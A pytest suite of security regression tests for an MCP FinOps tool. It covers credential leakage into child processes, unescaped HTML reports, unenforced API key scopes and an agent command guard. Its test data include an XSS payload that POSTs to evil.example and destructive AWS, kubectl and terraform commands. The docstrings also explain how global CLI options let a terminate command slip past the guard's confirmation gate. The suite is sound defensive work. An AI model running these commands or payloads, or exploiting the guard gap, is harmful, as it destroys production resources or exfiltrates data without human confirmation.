"""Security regressions from the 2026-08-11 audit.

Why this file exists, stated plainly: every defect pinned here is a place where
nable already knows the rule and breaks it somewhere else. connect_azure was
rewritten so that a secret can never reach a tool argument, and activate_pro
still takes one and then tells the user nothing left the machine.
reporting/dashboard.py escapes every cloud-supplied string before it reaches
HTML, and reporting/exporter.py interpolates the same strings raw into a file it
then opens in a browser. guard.py absorbs intervening CLI tokens for kubectl and
gcloud, and hard-codes `aws <service> <verb>` adjacency for the AWS one-way
doors, so `--profile prod` walks a terminate straight past the gate. A rule that
holds in one module and not its neighbour is not a rule, it is a coincidence,
and the only thing that turns it back into a rule is a test.

Where the seams are. Nothing below replaces a nable function. Three things are
faked, all of them outside the code under test:

  - the `terraform` and `git` binaries, real executables on PATH that record the
    argv and the environment they were handed. Everything from estimate_from_dir
    and run_git down to subprocess.run is ours and real.
  - the vault's storage directory, pointed at a tmp_path with the OS keychain
    switched off. The Fernet encrypt, the store, and load_to_env's writes into
    os.environ are the real ones.
  - nothing else. The MCP registry, the tool parameter schemas, the HTML
    generators, the guard classifier and the RBAC module are all imported and
    exercised as shipped.

Each test says in its own docstring whether it fails today because the defect is
real, or passes today because it guards an invariant that currently holds.

Findings that also have an MCP surface angle (create_api_key returning the raw
key, start_dashboard_server returning the password, the read-only annotation on
the terraform tools) are pinned in tests/test_audit_tool_surface.py and are not
repeated here. What this file adds on those is the part the annotation cannot
see: what the child process inherits.
"""
from __future__ import annotations

import ast
import os
import pathlib
import stat
import types

import pytest

_SRC = pathlib.Path(__file__).resolve().parents[1] / "src" / "finops"


# ── shared helpers ────────────────────────────────────────────────────────────

def _registered_tools():
    """The live MCP registry.

    finops.server is the only safe entry point: the finops.tools.* modules import
    it back, so importing one of them first raises a circular ImportError. Going
    through the registry also means these tests see the parameter schema a client
    actually receives, not a same-named module attribute.
    """
    import finops.server as srv
    return srv.mcp._tool_manager._tools


def _calls_in(path: pathlib.Path) -> set[str]:
    """Every function name called anywhere in a module, bare or attribute form."""
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            fn = node.func
            if isinstance(fn, ast.Name):
                names.add(fn.id)
            elif isinstance(fn, ast.Attribute):
                names.add(fn.attr)
    return names


def _callers_of(helper: str) -> list[str]:
    return sorted(p.relative_to(_SRC).as_posix()
                  for p in _SRC.rglob("*.py") if helper in _calls_in(p))


# ── 1. a secret must never reach a tool argument ──────────────────────────────
#
# An MCP tool argument is serialised into the conversation and shipped to the
# model provider before nable ever sees it, and the provider retains it. That is
# the exact transport tools/azure.py:20-24 refuses to put an Azure secret on.

# Parameter names that carry a credential. "_tokens" plural is a count (an AI
# budget measured in tokens), not a secret, so the suffix rule is singular on
# purpose, and key_id / tag_key / label_key are identifiers, not secrets.
_SECRET_PARAM_NAMES = frozenset({
    "key", "secret", "password", "passwd", "token", "credential", "credentials",
    "api_key", "apikey", "access_key", "access_key_id", "secret_key",
    "secret_access_key", "client_secret", "license_key", "private_key",
    "auth_token", "access_token", "service_account_key", "session_token",
})
_SECRET_PARAM_SUFFIXES = (
    "_secret", "_password", "_passwd", "_api_key", "_apikey", "_token",
    "_credential", "_credentials", "_private_key", "_secret_key",
)


def test_no_mcp_tool_takes_a_secret_as_an_argument():
    """FAILS TODAY, the defect is real: activate_pro(license_key=...).

    What breaks in production: the licence key travels to the model provider as
    a tool-call argument and sits in that provider's conversation history, and
    the tool then returns "The key was verified offline and stored locally;
    nothing left your machine" about the transport that just carried it.
    license.validate_key checks only the signature, the plan and the expiry,
    with no machine binding, so whoever can read that transcript holds a working
    transferable Pro entitlement until the payload expires.

    The rule is not new. connect_azure was rewritten specifically so an Azure
    secret could not reach a tool argument. This sweeps the whole live registry
    so the next tool that takes one fails here rather than in a transcript.
    """
    offenders = []
    for name, tool in sorted(_registered_tools().items()):
        for param in (tool.parameters.get("properties") or {}):
            if param in _SECRET_PARAM_NAMES or param.endswith(_SECRET_PARAM_SUFFIXES):
                offenders.append(f"{name}({param}=...)")
    assert not offenders, (
        "these MCP tools take a secret as an argument, which routes it through "
        f"the model provider and breaks the no-egress claim: {offenders}. Take "
        "the secret in the user's own terminal instead (`finops login`)."
    )


def test_the_terminal_path_can_still_store_a_licence_key():
    """PASSES TODAY, guards the fix direction.

    The storage layer is not the problem and must not be gutted to fix the tool.
    If this goes red, someone removed the licence key from the CLI path too, and
    a paying customer has no way at all to activate. The fix is to drop the MCP
    argument and keep this.
    """
    from finops import license as license_mod

    assert callable(getattr(license_mod, "store_license", None))
    assert callable(getattr(license_mod, "validate_key", None))
    # An obviously bogus key must be rejected offline, without network.
    status = license_mod.validate_key("FINOPS-2-not-a-real-key")
    assert status.mode not in ("pro", "team", "enterprise")


# ── 2. what a child process inherits ──────────────────────────────────────────
#
# load_vault_to_env flattens every stored credential into os.environ at server
# import, for the life of the process. Every subprocess site then spawns with no
# env=, so a directory nable was merely asked to price, or a repo it was asked to
# patch, is handed AWS_SECRET_ACCESS_KEY and GITHUB_TOKEN.

_AWS_SENTINEL = "vault-aws-secret-6f2c1a9e"
_GH_SENTINEL = "vault-github-token-6f2c1a9e"

_FAKE_TERRAFORM = """#!/bin/sh
REC="__REC__"
if [ "$1" = "plan" ]; then
  printf '%s\\n' "$@" > "$REC/plan_argv.txt"
  /usr/bin/env > "$REC/plan_env.txt"
  for a in "$@"; do
    case "$a" in
      -out=*) : > "${a#-out=}" ;;
    esac
  done
  exit 0
fi
if [ "$1" = "show" ]; then
  cat "__PLAN_JSON__"
  exit 0
fi
exit 1
"""

_FAKE_GIT = """#!/bin/sh
/usr/bin/env > "__REC__/git_env.txt"
exit 0
"""


@pytest.fixture
def vault_loaded_env(tmp_path, monkeypatch):
    """A real vault in a scratch dir, flattened into os.environ the real way.

    Not a fake: Vault.default() builds a real Fernet key file, store() really
    encrypts, and load_to_env() is the same call security/env.py makes at server
    startup. Only the directory it lives in is redirected, and the OS keychain is
    switched off so the suite never touches the developer's real one.

    The two variables are pre-set through monkeypatch with a placeholder before
    load_to_env overwrites them, so monkeypatch's own teardown restores the
    process environment whatever the test does.
    """
    from finops.security.vault import Vault

    monkeypatch.setenv("FINOPS_DATA_DIR", str(tmp_path / "vault-home"))
    monkeypatch.setenv("FINOPS_NO_KEYRING", "1")
    monkeypatch.delenv("FINOPS_PROFILE", raising=False)
    monkeypatch.delenv("FINOPS_VAULT_KEY", raising=False)
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "placeholder-not-the-vault-value")
    monkeypatch.setenv("GITHUB_TOKEN", "placeholder-not-the-vault-value")
    Vault._key_cache.clear()

    v = Vault.default()
    v.store("AWS_SECRET_ACCESS_KEY", _AWS_SENTINEL)
    v.store("GITHUB_TOKEN", _GH_SENTINEL)
    loaded = v.load_to_env()
    assert loaded == 2, "the vault flatten did not run, so this test proves nothing"
    yield
    Vault._key_cache.clear()


@pytest.fixture
def fake_terraform(tmp_path, monkeypatch):
    """A real executable named terraform that records how it was invoked.

    The boundary is the binary. estimate_from_dir, its argv, its cwd and the
    environment it hands the child are all real.
    """
    import json

    rec = tmp_path / "rec"
    rec.mkdir()
    plan_json = tmp_path / "plan.json"
    plan_json.write_text(json.dumps({"resource_changes": []}), encoding="utf-8")

    script = tmp_path / "terraform"
    script.write_text(
        _FAKE_TERRAFORM.replace("__REC__", str(rec)).replace("__PLAN_JSON__", str(plan_json)),
        encoding="utf-8",
    )
    script.chmod(0o755)
    monkeypatch.setenv("TERRAFORM_BIN", str(script))

    tf_dir = tmp_path / "customer-repo"
    tf_dir.mkdir()
    return types.SimpleNamespace(rec=rec, tf_dir=tf_dir)


@pytest.fixture
def fake_git(tmp_path, monkeypatch):
    """A real executable named git, first on PATH, that records its environment."""
    rec = tmp_path / "gitrec"
    rec.mkdir()
    bindir = tmp_path / "fakebin"
    bindir.mkdir()
    script = bindir / "git"
    script.write_text(_FAKE_GIT.replace("__REC__", str(rec)), encoding="utf-8")
    script.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ.get('PATH', '')}")

    repo = tmp_path / "customer-terraform"
    repo.mkdir()
    return types.SimpleNamespace(rec=rec, repo=repo)


def test_terraform_child_does_not_inherit_the_vault_credentials(
        vault_loaded_env, fake_terraform):
    """FAILS TODAY, the defect is real.

    What breaks in production: `terraform plan` runs in a directory the caller
    named, loads whatever provider plugins that directory declares, and executes
    its `data "external"` programs. Because subprocess.run is called with no
    env=, every one of those inherits the decrypted contents of the user's vault.
    estimate_terraform_cost, estimate_change_cost and check_action_policy all
    reach this line, and the read path is deliberately unconfined because "a read
    is not the write RCE vector", which stops being true once the read spawns a
    process holding AWS_SECRET_ACCESS_KEY.
    """
    from finops.connectors.terraform_estimate import estimate_from_dir

    estimate_from_dir(str(fake_terraform.tf_dir))
    child_env = (fake_terraform.rec / "plan_env.txt").read_text(encoding="utf-8")

    leaked = [n for n, v in (("AWS_SECRET_ACCESS_KEY", _AWS_SENTINEL),
                             ("GITHUB_TOKEN", _GH_SENTINEL)) if v in child_env]
    assert not leaked, (
        f"the terraform child inherited {leaked} from the vault flatten. Pass an "
        f"explicit minimal env= (PATH/HOME/TF_*) at this call site."
    )


def test_git_child_does_not_inherit_the_vault_credentials(vault_loaded_env, fake_git):
    """FAILS TODAY, the defect is real.

    What breaks in production: run_git is the helper the rightsizing PR path uses
    to branch, commit and push inside the customer's own Terraform repo. git
    executes hooks and `core.fsmonitor` from that repo's .git/config, so a repo
    nable was pointed at can run a program with the whole vault in its
    environment. Same one-line cause as the terraform case: no env=.
    """
    from finops.remediation.rightsizing_pr import run_git

    run_git(str(fake_git.repo), "status", "--porcelain")
    child_env = (fake_git.rec / "git_env.txt").read_text(encoding="utf-8")

    leaked = [n for n, v in (("AWS_SECRET_ACCESS_KEY", _AWS_SENTINEL),
                             ("GITHUB_TOKEN", _GH_SENTINEL)) if v in child_env]
    assert not leaked, (
        f"the git child inherited {leaked} from the vault flatten. Pass an "
        f"explicit minimal env= at this call site."
    )


def test_the_vault_key_file_is_not_world_readable(vault_loaded_env, tmp_path):
    """PASSES TODAY, guards an invariant that currently holds.

    The Fernet master key is the whole vault: anything that can read it can
    decrypt every stored credential. If this goes red, a refactor dropped the
    0600 on the key file and every local account on the box can read the user's
    cloud credentials straight off disk.
    """
    key_path = tmp_path / "vault-home" / "vault.key"
    assert key_path.exists(), "the vault did not create a key file, so this proves nothing"
    mode = stat.S_IMODE(key_path.stat().st_mode)
    assert mode == 0o600, f"vault.key is {oct(mode)}, it must be owner-read-only"


# ── 3. generated artifacts ────────────────────────────────────────────────────

_XSS = '<img src=x onerror="fetch(\'https://evil.example/x\',{method:\'POST\'})">'


def test_exported_html_report_escapes_cloud_supplied_names():
    """FAILS TODAY, the defect is real.

    What breaks in production: _html_table drops every cell into the page raw,
    and those cells hold instance Name tags, which anyone with ec2:CreateTags can
    set. Only title and generated_by are escaped, under a comment that names this
    exact risk for those two fields. export_cost_report then runs `open` on the
    file by default, so the payload executes from a file:// origin and can POST
    the org's entire cost report off the box, which falsifies the no-egress
    claim. reporting/dashboard.py and briefing/render.py already escape the same
    strings; this generator was missed.
    """
    from finops.reporting.exporter import build_html_report

    html = build_html_report(
        title="Q3 cost report",
        period_start="2026-07-01",
        period_end="2026-07-31",
        rightsizing={"recommendations": [{
            "name": _XSS,
            "instance_id": "i-0abc",
            "instance_type": "m5.4xlarge",
            "recommended_type": "m5.2xlarge",
            "avg_cpu_pct": 3.0,
            "monthly_savings": 280.32,
        }]},
        anomalies={"anomalies": [{
            "provider": "aws", "service": _XSS, "severity": "high",
            "change": "+40%", "today": "$900", "baseline_avg": "$640",
        }]},
    )

    assert "<img src=x onerror" not in html, (
        "a cloud-supplied resource name was interpolated into the exported "
        "report as live markup. html.escape every cell in _html_table."
    )
    assert "&lt;img src=x onerror" in html, (
        "the payload should still be readable in the report, escaped, not dropped"
    )


def test_the_account_dashboard_generator_still_escapes(monkeypatch):
    """PASSES TODAY, guards the invariant the exporter broke.

    This is the control for the test above. reporting/dashboard.py has _esc and
    uses it, which is the behaviour the exporter is supposed to copy. If this
    goes red, the escaping regressed in the one generator that had it right, and
    every HTML artifact nable produces is now injectable.
    """
    from finops.reporting.dashboard import _build_html

    html = _build_html(
        account_id="123456789012", this_month=1000.0, last_month=900.0,
        projected=1100.0,
        top_services=[{"service": _XSS, "this_month": 500.0, "last_month": 400.0}],
        opportunities=[],
        savings_summary={"verified_monthly_usd": 0, "acted_on_monthly_usd": 0},
        savings_ledger=[], budgets=[], generated_at="2026-08-11",
    )
    assert "<img src=x onerror" not in html


def _brief_html() -> str:
    from finops.briefing.brief import Brief
    from finops.briefing.render import to_html
    return to_html(Brief(generated_at="2026-08-11T06:00:00", items=[],
                         gaps=["CloudWatch throttled in eu-west-1"]))


def _account_dashboard_html() -> str:
    from finops.reporting.dashboard import _build_html
    return _build_html(
        account_id="123456789012", this_month=1000.0, last_month=900.0,
        projected=1100.0, top_services=[], opportunities=[],
        savings_summary={"verified_monthly_usd": 0, "acted_on_monthly_usd": 0},
        savings_ledger=[], budgets=[], generated_at="2026-08-11",
    )


@pytest.mark.parametrize("generator", [_brief_html, _account_dashboard_html],
                         ids=["morning_brief", "account_dashboard"])
def test_generated_html_does_not_fetch_remote_fonts(monkeypatch, generator):
    """FAILS TODAY, the defect is real.

    What breaks in production: both generators hard-code a Google Fonts
    preconnect and stylesheet, and the tool that produces the file runs `open` on
    it, so the browser hits fonts.googleapis.com the moment the artifact is
    created. Neither host appears in docs/network-manifest.json, whose first line
    promises it lists every external endpoint nable may connect to, and the
    enterprise audit test we publish is that an air-gapped run plus a packet
    capture shows provider APIs only. telemetry, benchmarks and update_check all
    honour FINOPS_AIRGAP; these two artifacts sit outside that enforcement point
    entirely, so no switch can turn them off.
    """
    from finops import config

    monkeypatch.setenv("FINOPS_AIRGAP", "1")
    monkeypatch.setattr(config, "AIRGAP", True)

    html = generator()
    for host in ("fonts.googleapis.com", "fonts.gstatic.com"):
        assert host not in html, (
            f"the generated page requests {host} even with FINOPS_AIRGAP=1, and "
            f"the published network manifest does not list it. Inline the woff2 "
            f"files as data: URIs, or drop to locally available faces."
        )


# ── 4. the scope half of an API key ───────────────────────────────────────────

@pytest.mark.parametrize("helper", ["enforce_team_scope", "enforce_provider_scope"])
def test_api_key_scope_is_enforced_somewhere(helper):
    """FAILS TODAY, the defect is real.

    What breaks in production: create_api_key's own documented promise is
    "Restrict the key to one team's data". Both enforcement helpers exist, both
    are imported into server.py, and neither is ever called, so scope_team is a
    string in a column with no reader. A key created as viewer scoped to one team
    reads the whole org's spend through every cost tool and, on a hosted box,
    through /v1/costs, /api/data, /odata/Costs and the Tableau CSV export. The
    role half of Identity IS honoured, which is exactly what makes the scope half
    so easy to trust.
    """
    callers = _callers_of(helper)
    assert callers, (
        f"{helper} is defined and imported but never called anywhere in "
        f"src/finops. Either enforce scope at the query layer or refuse to create "
        f"a scoped key until it is enforced, so the promise matches the code."
    )


def test_the_role_half_of_an_identity_is_enforced_in_many_places():
    """PASSES TODAY, and it is the control for the test above.

    If require_role also came back with no callers, the AST scanner would be
    broken rather than the product. This proves the scanner finds real call sites,
    so the empty result for the two scope helpers means what it says.
    """
    callers = _callers_of("require_role")
    assert len(callers) >= 5, (
        f"require_role was found in only {callers}; the scanner, not the product, "
        f"is what changed"
    )


# ── 5. the agent guard's one-way doors ────────────────────────────────────────
#
# guard.py's own comment: "Over-matching is tolerable (worst case an unnecessary
# confirm); missing a one-way door is not."

_GLOBAL_OPTION_FORMS = [
    ("profile-terminate",
     "aws --profile prod ec2 terminate-instances --instance-ids i-1", "terminate_instance"),
    ("region-terminate",
     "aws --region us-east-1 ec2 terminate-instances --instance-ids i-1", "terminate_instance"),
    ("output-delete-snapshot",
     "aws --output json ec2 delete-snapshot --snapshot-id snap-1", "snapshot_delete"),
    ("profile-release-address",
     "aws --profile prod ec2 release-address --allocation-id eipalloc-1", "release_ip"),
    ("region-delete-volume",
     "aws --region eu-west-1 ec2 delete-volume --volume-id vol-1", "delete_resource"),
    ("profile-s3-rm-recursive",
     "aws --profile prod s3 rm s3://prod-data --recursive", "delete_resource"),
    ("profile-s3-rb",
     "aws --profile prod s3 rb s3://prod-data --force", "delete_resource"),
]


@pytest.mark.parametrize("command,action",
                         [(c, a) for _, c, a in _GLOBAL_OPTION_FORMS],
                         ids=[i for i, _, _ in _GLOBAL_OPTION_FORMS])
def test_a_one_way_door_is_still_classified_with_a_global_cli_option(command, action):
    """FAILS TODAY, the defect is real.

    What breaks in production: the AWS patterns hard-code `aws <service> <verb>`
    adjacency, so any global option between them defeats the classifier.
    classify_command returns None, gate_command returns None, and the hook exits
    0 without a word, which means an agent terminates instances or empties a
    bucket with no confirmation. `--profile` is the normal invocation form in
    precisely the multi-account shops nable targets. Every non-AWS classifier
    already absorbs intervening tokens with (?:\\S+\\s+)*, so the fix is to use
    the same absorber here.
    """
    from finops.guard import classify_command

    hit = classify_command(command)
    assert hit is not None, (
        f"the guard has no opinion on {command!r}, so it runs unchallenged. Add a "
        f"global-option absorber to the aws patterns."
    )
    door, action_type = hit
    assert door == "one_way", f"{command!r} classified as {door}, not one_way"
    assert action_type == action, (
        f"{command!r} classified as {action_type}, expected {action}")


@pytest.mark.parametrize("command,action_type", [
    ("aws ec2 terminate-instances --instance-ids i-1", "terminate_instance"),
    ("aws s3 rm s3://prod-data --recursive", "delete_resource"),
    ("kubectl --context prod delete deployment api", "delete_resource"),
    ("gcloud --project prod compute instances delete web-1", "delete_resource"),
    ("terraform -chdir=infra destroy", "delete_resource"),
])
def test_the_classifiers_that_already_work_keep_working(command, action_type):
    """PASSES TODAY, guards against a sloppy fix.

    The bare AWS forms and the three non-AWS classifiers that already absorb
    intervening tokens are the baseline. If a fix for the test above breaks any of
    these, the guard has traded one blind spot for another, and the blind spot is
    a command that deletes production.
    """
    from finops.guard import classify_command

    assert classify_command(command) == ("one_way", action_type)


def test_a_harmless_read_is_still_not_gated():
    """PASSES TODAY, guards against fixing the gap by matching everything.

    Broadening the patterns until `aws ec2 describe-instances` needs a human is
    how a safety gate gets uninstalled. Over-matching is tolerable, gating every
    read is not.
    """
    from finops.guard import classify_command

    for command in ("aws --profile prod ec2 describe-instances",
                    "aws --profile prod ce get-cost-and-usage",
                    "terraform -chdir=infra plan",
                    "kubectl --context prod get pods"):
        assert classify_command(command) is None, f"{command!r} should not be gated"
